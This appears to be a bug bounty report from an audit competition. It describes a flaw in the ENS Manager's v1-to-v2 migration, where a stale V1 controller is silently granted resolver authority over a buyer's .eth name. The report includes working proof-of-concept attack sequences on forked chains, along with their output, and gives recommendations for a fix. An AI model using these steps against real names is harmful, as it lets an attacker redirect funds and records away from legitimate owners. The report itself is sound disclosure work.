# 91337 w a critical v1 to v2 migration silently grants the v1 registry controller resolver authority over the buyer s name

**Submitted on Aug 31st 2026 at 17:59:09 UTC by @Kuzomo for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #91337
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/manager>
* **Impacts:**
  * Hijacking or bricking an ENS name during a Manager flow (registration, v1 to v2 migration, or transfer), such as:
    * a registration or migration that assigns the name, its ownership, registry, or resolver to an attacker
    * redirecting the recipient of a name transfer
    * leaving a name permanently inaccessible after the flow

## Description

## Brief/Intro

For an unwrapped `.eth` name the Manager derives the migration's role-grant recipient from the V1 subgraph's `domain.owner.id` — the ENS registry *controller* — whenever it differs from the BaseRegistrar registrant, and grants that address `ROLE_SET_RESOLVER` on the V2 ETHRegistry inside the batch the user signs.

Those two roles diverge by default on an ordinary sale: `BaseRegistrar.transferFrom` moves the ERC-721 but does not touch `ENSRegistry.owner(node)`, and `reclaim` is a separate transaction the buyer must know to send. A seller who never calls it stays the controller after the buyer owns the name. The subgraph reports that state correctly, so no indexer compromise is involved — the migration simply treats the seller as the buyer's manager.

Nothing in the flow identifies the recipient: preflight computes only a boolean and never reads `owner.id` on chain, the batch's own post-state expectation asserts the grant *succeeded*, and the one step that does mention the operation calls it "Restore the existing managers for your names" — which reads as routine housekeeping to a buyer who has no idea a stranger holds their V1 controller slot.

In the run below the migration completes on a Sepolia fork with the victim as the V2 owner and the attacker holding no roles at all — and then the grant the Manager appends in the same flow moves the attacker's bitmap to `16777216`, after which the attacker sets the resolver on a name the victim still owns.

## Vulnerability Details

The subgraph query returns the registrant and the registry owner as separate fields:

```ts
apps/manager/src/features/migration/service/v1SubgraphClient.ts:7    const V1_SUBGRAPH_URL = 'https://v1-graphql.ens.dev/subgraph'
apps/manager/src/features/migration/service/v1SubgraphClient.ts:36       owner { id }
apps/manager/src/features/migration/service/v1SubgraphClient.ts:37       registrant { id }
```

`classifyName` gates on the registrant — the caller must hold the ERC-721 — and then lifts the *other* address into `managerAddress`:

```ts
// packages/migration/src/service/classifyNames.ts:149-167
const registrant = domain.registrant
if (registrant?.id.toLowerCase() !== addr) return null      // victim holds the NFT
...
const registryOwnerAddress = toAddress(domain.owner.id)     // V1 controller
const managerAddress: Address | null =
  registryOwnerAddress &&
  registryOwnerAddress.toLowerCase() !== registrant.id.toLowerCase()
    ? registryOwnerAddress
    : null
```

<https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/packages/migration/src/service/classifyNames.ts#L149-L167>

That value becomes the account in a `grantRoles` call against the V2 registry:

```ts
apps/manager/src/features/migration/service/buildRoleGrantCalls.ts:9    const ROLE_SET_RESOLVER = 1n << 24n
apps/manager/src/features/migration/service/buildRoleGrantCalls.ts:22       functionName: 'grantRoles',
apps/manager/src/features/migration/service/buildRoleGrantCalls.ts:23       args: [resource, ROLE_SET_RESOLVER, name.managerAddress],
```

<https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/migration/service/buildRoleGrantCalls.ts#L11-L27>

The call is appended to the same atomic batch as the migration itself, and a verification expectation is recorded alongside it:

```ts
apps/manager/src/features/migration/service/buildAtomicMigrationBatches.ts:608   if (classified.managerAddress) {
apps/manager/src/features/migration/service/buildAtomicMigrationBatches.ts:610       phase: 'manager-role-grant',
apps/manager/src/features/migration/service/buildAtomicMigrationBatches.ts:622       account: classified.managerAddress,
apps/manager/src/features/migration/service/buildAtomicMigrationBatches.ts:623       roleBitmap: ROLE_SET_RESOLVER,
```

<https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/migration/service/buildAtomicMigrationBatches.ts#L608-L625>

Every control that could catch this is positioned so that it cannot. Preflight reduces the condition to a boolean and performs no on-chain read of `owner.id`:

```ts
apps/manager/src/features/migration/service/computeMigrationPreflight.ts:205   const requiresManagerRestoration = classified.some(
apps/manager/src/features/migration/service/computeMigrationPreflight.ts:206     (name) => name.managerAddress !== null,
```

The post-state check at line 623 asserts the grant landed, so it confirms the transfer of authority rather than questioning it.

The user is shown a step for this, but it is worded as though the grantees were already theirs:

```tsx
// apps/manager/src/features/migration/components/WalletConfirmationStepsDialog.tsx:81-89
// (fragment wrapper and className attributes elided; strings are verbatim)
.with({ type: 'approval', approvalId: 'eth-registry:hca' }, () => (
  <h3 ...><Trans>Approve manager restoration</Trans></h3>
  <p  ...><Trans>Restore the existing managers for your names.</Trans></p>
))
```

<https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/migration/components/WalletConfirmationStepsDialog.tsx#L81-L89>

No address appears there or anywhere else, because the descriptor type carries no field that could hold one:

```ts
// apps/manager/src/features/migration/service/buildStepDescriptors.ts:13-31
export type MigrationStepDescriptor =
  | { readonly type: 'deploy-hca' }
  | {
      readonly type: 'approval'
      readonly approvalId: MigrationApprovalId
      readonly count?: number
      readonly name?: string
      readonly tokenId?: bigint
    }
  | {
      readonly type: 'atomic-batch'
      readonly index: number
      readonly total: number
      readonly count: number
    }
  | {
      readonly type: 'cleanup'
      readonly approvalId: MigrationApprovalId
    }
```

<https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/migration/service/buildStepDescriptors.ts#L13-L31>

The name's resolver follows the same source. Where the strategy is `keep-v1`, `resolverFor` installs the V1 resolver address on the migrated name — and on a name whose controller is the attacker, that resolver is whatever the attacker set, since `setResolver` on V1 is the controller's privilege (`apps/manager/src/features/migration/service/encodeMigration.ts:34`).

## Impact Details

A `.eth` name sold or transferred without a follow-up `reclaim` carries a latent grant: the moment the buyer migrates it, the previous holder receives `ROLE_SET_RESOLVER` on the V2 registry for that name. Holding it means setting the name's resolver at will, which redirects every `addr`, `contenthash` and text lookup for the name — so funds sent to the name go to an address the attacker chooses, and the name's records read as the attacker writes them.

The grant is recoverable, and the bound is worth stating plainly. The name's owner keeps the admin bit and can call `revokeRoles` to remove it; on the fork that call succeeds, the attacker's bitmap returns to `0` and `setResolver` reverts for them again (step `[7]` of Part 2).

What the owner does not get is any reason to make that call. No step in the migration names the grantee, the Manager has no view of V2 registry roles at all, and the only surface that renders them is the Explorer's per-name roles page in a different app (`apps/portal/src/routes/$name/roles/index.tsx`), which the owner has to think to visit.

The exposure therefore runs from migration until the owner independently discovers a role they were never told was created, and the attacker chooses when inside that window to move the resolver.

Migration is what would otherwise have ended the attacker's control, which is why this is not a preservation of the status quo. A migrated name's authority lives in V2: the migration controller takes the V1 token and holds it until expiry, the V1 registry namespace beneath the 2LD stops being authoritative, and roles on `ETHRegistry` become the only thing that governs the name (`apps/manager/src/features/migration/MIGRATION_CASE_STUDY.md:46-52`).

Part 2 measures this directly against the deployed Sepolia `ETHRegistry` (`0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2`): once the real migration has completed — `getStatus == 2`, owner the victim — the attacker holds `0` roles. The V1 controller slot carries nothing across on its own.

It is the grant the Manager appends, in the same flow, that raises the attacker to `16777216` (`0x1000000`, `ROLE_SET_RESOLVER`) and lets them move the resolver while the victim remains the owner. The buyer's migration is therefore the single act that converts a stale V1 slot the migration was about to make irrelevant into a live V2 role over their name — and it is the buyer who signs it.

The precondition is not exotic. It is the default post-condition of an ERC-721 marketplace sale, since `reclaim` is a separate transaction most sellers and buyers never send; the attacker can also produce it unilaterally by sending a name they control to the target and waiting for it to be migrated.

Scope is one name per grant, and the attacker cannot transfer the name or take its ownership — the impact is control of what the name resolves to, not custody of the name itself.

## Feasibility Limitations

No trusted role, privileged address or leaked credential is involved. The attacker is an ordinary account that holds, or once held, a `.eth` name; `transferFrom` and `reclaim` are permissionless, and the attacker performs both against a name they own before the victim is ever involved.

Nothing is misconfigured and no parameter is exceeded: the subgraph reports true chain state, the migration payload is well-formed by every check the app applies, and the divergence between registrant and controller is a documented property of ENS V1 rather than a fault the attacker induces.

The victim's only action is migrating a name they legitimately own through the Manager's primary advertised flow — no un-prompted or out-of-workflow interaction is required, and no wallet connection beyond the one migration already needs.

The behaviour is a property of the pinned competition source at `1c9b47f18fcddd2e864dfe385c4171061c9811ae`; the V2 registry is live at the address above, so no governance action, runtime upgrade or future provisioning is required.

Attack investment is a name the attacker already holds, two transactions to arm it (`reclaim`, then the ERC-721 transfer to the target), and one afterwards to move the resolver.

The grant is constructed and inserted entirely within the in-scope `apps/manager` subtree (`buildRoleGrantCalls.ts`, `buildAtomicMigrationBatches.ts`); `classifyNames.ts` is shown only to trace where the recipient value originates.

Neither the ENS smart contracts nor the subgraph need to misbehave — the subgraph's answer is correct and the contracts honour a role the app asked them to grant.

## Recommendation

Verify the recipient against chain state before granting, rather than trusting the indexed field. The registry owner is a single `eth_call`:

```ts
// note: V1_CONTRACTS holds only BaseRegistrar and NameWrapper, so resolve the
// registry the way the rest of the app already does (see profileExpiry.ts:56)
const onChainController = await publicClient.readContract({
  address: getChainContractAddress({ chain: sepoliaWithEns, contract: 'ensRegistry' }),
  abi: parseAbi(['function owner(bytes32 node) view returns (address)']),
  functionName: 'owner',
  args: [namehash(domain.name)],
})
if (onChainController.toLowerCase() !== domain.owner.id.toLowerCase()) throw new Error('stale index')
```

That closes the stale-index case but not this one, because here the index is correct.

The substantive fix is to stop treating the V1 controller as an implicit grantee: drop the automatic `manager-role-grant`, and if preserving a co-manager is a wanted feature, surface it as its own confirmation step that names the recipient address, defaulting to off.

`MigrationStepDescriptor` has no variant able to display it today, so the `atomic-batch` step should be split so that a batch containing a `manager-role-grant` renders the account being granted, and the "Restore the existing managers for your names" copy should not assert ownership of a grantee the app has not checked belongs to the user.

At minimum, skip the grant whenever `managerAddress` is not an address the migrating user controls.

## References

* opaque grantee lifted from the index: <https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/packages/migration/src/service/classifyNames.ts#L149-L167>
* grantRoles construction: <https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/migration/service/buildRoleGrantCalls.ts#L11-L27>
* grant appended to the signed batch, with its post-state expectation: <https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/migration/service/buildAtomicMigrationBatches.ts#L608-L625>
* preflight reduces the condition to a boolean: <https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/migration/service/computeMigrationPreflight.ts#L205-L207>
* user-visible step descriptors, no recipient field: <https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/migration/service/buildStepDescriptors.ts#L13-L31>
* subgraph source fields: <https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/migration/service/v1SubgraphClient.ts#L30-L45>
* V1 resolver carried through on keep-v1: <https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/migration/service/encodeMigration.ts#L24-L50>

## Proof of Concept

Part 1 shows the precondition is real on mainnet. Part 2 is the whole finding in one continuous run: it creates that precondition on chain, lets the Manager's own code classify the resulting state and build both the migration and the grant, executes them as the victim, and reads the result back.

Forks only; nothing was broadcast to a public network.

{% stepper %}
{% step %}

## Clone the repository and install dependencies

```bash
git clone https://github.com/immunefi-team/audit-comp-ens && cd audit-comp-ens
git checkout 1c9b47f18fcddd2e864dfe385c4171061c9811ae
pnpm install
```

{% endstep %}

{% step %}

## Part 1 — Test the precondition on mainnet

A forge project with the `.t.sol` file below:

```bash
forge test --fork-url https://ethereum-rpc.publicnode.com --match-contract EnsV1ControllerPersistence -vv
```

{% endstep %}

{% step %}

## Part 2 — Run the end-to-end Sepolia fork test

Save the spec below into `apps/manager/src/features/migration/service/`:

```bash
anvil --fork-url https://ethereum-sepolia-rpc.publicnode.com --port 8545 &
cd apps/manager && NODE_ENV=production pnpm vitest run --environment node \
  src/features/migration/service/poc_e2e_sepolia_fork.test.ts
```

{% endstep %}
{% endstepper %}

### Part 1 — The precondition on mainnet

A live name is acquired and then sold as an ERC-721 only:

```solidity
IENSRegistry constant REGISTRY = IENSRegistry(0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e);
IBaseRegistrar constant BASE   = IBaseRegistrar(0x57f1887a8BF19b14fC0dF6Fd9B2acc9Af147eA85);

// any registered, unexpired 2LD works; the label is not special
string memory label = "vitalik";
uint256 tokenId = uint256(keccak256(bytes(label)));
bytes32 node = keccak256(abi.encodePacked(ETH_NODE, keccak256(bytes(label))));
require(BASE.nameExpires(tokenId) > block.timestamp, "pick a live name");

address origRegistrant = BASE.ownerOf(tokenId);
vm.prank(origRegistrant);
BASE.transferFrom(origRegistrant, ATTACKER, tokenId);
vm.prank(ATTACKER); BASE.reclaim(tokenId, ATTACKER);   // attacker = registrant AND controller

vm.prank(ATTACKER);
BASE.transferFrom(ATTACKER, VICTIM, tokenId);          // sells ONLY the ERC-721

assertEq(BASE.ownerOf(tokenId), VICTIM);               // registrant moved
assertEq(REGISTRY.owner(node), ATTACKER);              // controller did NOT
vm.prank(ATTACKER); REGISTRY.setResolver(node, EVIL_RESOLVER);   // still succeeds
```

```
[PASS] test_ControllerSurvivesErc721Sale() (gas: 114060)
  original registrant: 0x220866B1A2219f40e72f5c628B65D54268cA3A9D
  after acquire: registrant: 0x0000000000000000000000000000000000002222
  after acquire: controller: 0x0000000000000000000000000000000000002222
  after sale: registrant (victim): 0x0000000000000000000000000000000000001111
  after sale: controller (attacker): 0x0000000000000000000000000000000000002222
  attacker-set V1 resolver: 0x0000000000000000000000000000000000003333
```

### Part 2 — End to end against a Sepolia fork

Using `demo.eth` (unwrapped, unexpired, `getStatus == 1` unmigrated at the pinned block). The `V1Domain` is not a fixture: every field is read back off the forked chain after the transfers, so `classifyName` sees real state.

`buildMigrationHelperCall`, `resolverFor`, `buildRoleGrantCall` and `buildStepDescriptors` are the app's own functions, imported unmodified:

```ts
// 1. attacker acquires, points the V1 resolver at itself, then sells only the ERC-721
await send(orig,     V1.BaseRegistrar, encode('transferFrom', [orig, ATTACKER, tid]))
await send(ATTACKER, V1.BaseRegistrar, encode('reclaim',      [tid, ATTACKER]))
await send(ATTACKER, ENS_REGISTRY,     encode('setResolver',  [node, EVIL]))
await send(ATTACKER, V1.BaseRegistrar, encode('transferFrom', [ATTACKER, VICTIM, tid]))

// 2. the app classifies state read back from the chain
const domain = { resolver: { address: v1resolver }, owner: { id: controller },
                 registrant: { id: registrant }, /* ...all from eth_call... */ } as V1Domain
const classified = classifyName(domain, VICTIM).name

// 3. the app builds the migration and the grant
const migrateCall = buildMigrationHelperCall([{ name: NAME, tokenType: classified.tokenType,
  parentName: 'eth', data: createMigrationData({ label: LABEL, owner: VICTIM,
  resolver: resolverFor(classified, V2.DefaultResolver, null) }) }])
const grantCall = buildRoleGrantCall(classified)

// 4. the victim migrates, then executes the grant the app appended
await send(VICTIM, V1.BaseRegistrar, encode('setApprovalForAll', [V2.MigrationHelper, true]))
await send(VICTIM, migrateCall.to, migrateCall.data)
await send(VICTIM, grantCall.to,   grantCall.data)

// 5. the attacker moves the resolver on the victim's migrated V2 name
await send(ATTACKER, V2.ETHRegistry, encode('setResolver', [resource, EVIL]))

// 6. and the owner can take the role back, once they know to
await send(VICTIM, V2.ETHRegistry, encode('revokeRoles', [resource, 1n << 24n, ATTACKER]))
```

```
[1] registrant (victim)   = 0x1111111111111111111111111111111111111111
[1] controller (attacker) = 0x2222222222222222222222222222222222222222
[1] v1 resolver (attacker set) = 0x3333333333333333333333333333333333333333
[2] classifyName -> tokenType=unwrapped managerAddress=0x2222222222222222222222222222222222222222
[3] app-built grant -> grantRoles(26446653644574158990076181421067324203610722992339905729104254595347626590208, 16777216, 0x2222222222222222222222222222222222222222)
[3] entire user-visible plan = [{"type":"atomic-batch","index":0,"total":1,"count":1}]
[4] migrated: v2 status=2 owner=0x1111111111111111111111111111111111111111
[4] attacker roles WITHOUT the grant = 0   <-- migration alone extinguishes them
[5] attacker roles AFTER the grant  = 16777216
[6] attacker setResolver SUCCEEDED; owner still = 0x1111111111111111111111111111111111111111
[7] victim revokeRoles -> attacker roles = 0   (recoverable, once noticed)

 Test Files  1 passed (1)
      Tests  1 passed (1)
```

Line `[4]` is the part worth reading twice. The migration succeeds on its own — the name is in V2, `status == 2`, and the victim is its owner — and at that moment the attacker holds **zero** roles.

The V1 controller slot buys nothing in V2 by itself. It is the grant the Manager appends, in the same flow, that hands the attacker `16777216` (`0x1000000`, `ROLE_SET_RESOLVER`) and with it the resolver of a name the victim owns.

Step `[7]` closes the loop on the same name: the owner holds the admin bit and `revokeRoles` takes the role back, so the exposure is bounded by discovery rather than being irreversible. Nothing in the migration flow tells them there is something to undo.
